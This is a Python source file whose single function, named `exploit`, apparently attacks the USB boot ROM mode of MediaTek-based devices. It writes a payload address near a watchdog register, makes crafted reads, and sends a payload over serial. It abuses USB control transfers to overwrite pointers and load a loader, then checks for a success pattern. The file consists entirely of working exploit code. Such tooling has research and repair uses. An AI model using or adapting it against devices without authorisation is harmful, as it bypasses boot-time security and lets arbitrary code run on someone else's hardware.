from src.common import to_bytes, from_bytes
from serial.serialutil import SerialException

import usb
import array


def exploit(device, watchdog_address, payload_address, var_0, var_1, ptrs, fp, pp, payload, loader):
    addr = watchdog_address + 0x50

    if not fp:
        device.write32(addr, from_bytes(to_bytes(payload_address, 4), 4, '<'))
        if var_0:
            readl = var_0 + 0x4
            device.read32(addr - var_0, readl // 4)
        else:
            cnt = 15
            for i in range(cnt):
                device.read32(addr - (cnt - i) * 4, cnt - i + 1)

        device.echo(0xE0)

        device.echo(len(payload), 4)

        status = device.read(2)
        if from_bytes(status, 2) != 0:
            raise RuntimeError("status is {}".format(status.hex()))

        device.write(payload)

        # clear 4 bytes
        device.read(4)

    udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)

    try:
        # noinspection PyProtectedMember
        udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
    except AttributeError as e:
        raise RuntimeError("libusb is not installed for port {}".format(device.dev.port)) from e

    try:
        if ptrs:
            buf = udev.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
            for ptr in ptrs:
                udev.ctrl_transfer(0x21, 0x20, 0, 0, buf + array.array('B', to_bytes(ptr, 4, '<')))
                udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)

            udev.ctrl_transfer(0x21, 0x20, 0, 0, array.array('B', loader))

        if not fp:
            udev.ctrl_transfer(0xA1, 0, 0, var_1, 0)

    except usb.core.USBError as e:
        print(e)

    if fp and pp:
        device.echo(0x88)
        device.echo(0xC4)
        device.echo(0x08)
        device.echo(0x11)
        device.echo(0xA9)

        device.echo(fp, 4)
        device.echo(4, 4)

        status = device.read(2)
        if from_bytes(status, 2) != 0:
            raise RuntimeError("status is {}".format(status.hex()))

        device.write(to_bytes(pp, 4, '<'))

        result = device.read(4)
        if from_bytes(result, 4) != 0xD1D2D3D4:
            raise RuntimeError("Unexpected result {}".format(result.hex()))

        device.write(to_bytes(payload_address, 4, '<'))
        device.write(to_bytes(len(payload), 4, '<'))

        device.write(payload)

    # We don't need to wait long, if we succeeded
    # noinspection PyBroadException
    try:
        device.dev.timeout = 1
    except Exception:
        pass

    try:
        pattern = device.read(4)
    except SerialException as e:
        print(e)
        return False

    return pattern
